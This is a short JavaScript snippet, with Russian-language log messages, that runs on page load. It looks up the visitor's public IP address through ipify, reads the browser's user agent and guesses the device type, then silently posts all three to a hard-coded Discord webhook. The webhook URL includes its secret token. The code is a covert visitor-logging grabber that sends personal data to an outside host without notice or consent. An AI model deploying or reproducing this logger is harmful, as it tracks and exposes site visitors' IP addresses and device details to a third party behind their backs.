function sendWebhookMessage(message) {
    const webhookUrl = 'https://discord.com/api/webhooks/1104855216899248332/7m3WHRCwidYcFWIHwYwcSKOVQUsdkQsk8vduVL1AUfSnfO1AjNN8SZ84vNzhB_ACT4cq';

    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            content: message,
        }),
    })
        .then(() => {
            console.log('Уведомление успешно отправлено в Discord');
        })
        .catch((error) => {
            console.error('Ошибка при отправке уведомления в Discord:', error);
        });
}
function getDeviceType(userAgent) {
    const devicePatterns = {
        Mobile: /Mobile|iPhone|iPod|Android|BlackBerry|Windows Phone/i,
        Tablet: /Tablet|iPad|PlayBook|Nexus Tablet|Kindle|Surface|Android(?!.*Mobile)/i,
        Desktop: /Windows|Macintosh|Linux/i,
    };

    for (const [deviceType, pattern] of Object.entries(devicePatterns)) {
        if (pattern.test(userAgent)) {
            return deviceType;
        }
    }

    return 'Unknown';
}

const browser = navigator.userAgent;


const device = getDeviceType(browser);


fetch('https://api.ipify.org?format=json')
    .then((response) => response.json())
    .then((data) => {
        const ip = data.ip;
        const message = `IP: ${ip}, Browser: ${browser}, Device: ${device}`;
        sendWebhookMessage(message);
    })
    .catch((error) => {
        console.error('Ошибка при получении IP-адреса:', error);
    });
